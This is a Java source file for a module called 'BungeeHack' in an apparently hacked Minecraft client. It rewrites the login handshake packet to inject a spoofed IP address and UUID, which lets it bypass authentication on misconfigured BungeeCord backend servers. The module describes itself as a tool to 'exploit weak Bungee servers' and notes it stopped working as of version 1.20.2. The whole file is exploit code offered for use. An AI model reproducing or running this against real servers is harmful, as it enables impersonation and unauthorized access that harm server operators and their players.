package falsify.falsify.module.modules.misc;

import falsify.falsify.listeners.Event;
import falsify.falsify.listeners.events.EventPacketSend;

import falsify.falsify.module.Category;
import falsify.falsify.module.Module;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.handshake.ConnectionIntent;
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;

public class BungeeHack extends Module {
    final MinecraftClient mc = MinecraftClient.getInstance();
    public String ip = "1.2.3.4";
    public String uuid = mc.getSession().getUuidOrNull().toString().replace("-","");

    public BungeeHack() {
        super("BungeeHack", "Exploit weak Bungee servers. (Not Working as of 1.20.2)", true, Category.MISC, -1);
    }

    @Override
    public void onEnable() {
    }

    @Override
    public void onEvent(Event<?> event) {
        if(event instanceof EventPacketSend eventPacketSend){
            if(eventPacketSend.getPacket() instanceof HandshakeC2SPacket p){
                if(p.intendedState().equals(ConnectionIntent.LOGIN)){
//                    PacketByteBuf buffer = new PacketByteBuf(Unpooled.buffer());
//                    buffer.writeVarInt(p.protocolVersion());
//                    buffer.writeString(p.address() + "\000" + ip + "\000" + uuid);
//                    buffer.writeShort(p.port());
//                    buffer.writeVarInt(p.intendedState().getId());

                    HandshakeC2SPacket packet = new HandshakeC2SPacket(p.protocolVersion(), p.address() + "\000" + ip + "\000" + uuid, p.port(), p.intendedState());
                    eventPacketSend.setPacket(packet);
                }
            }
        }
    }
}
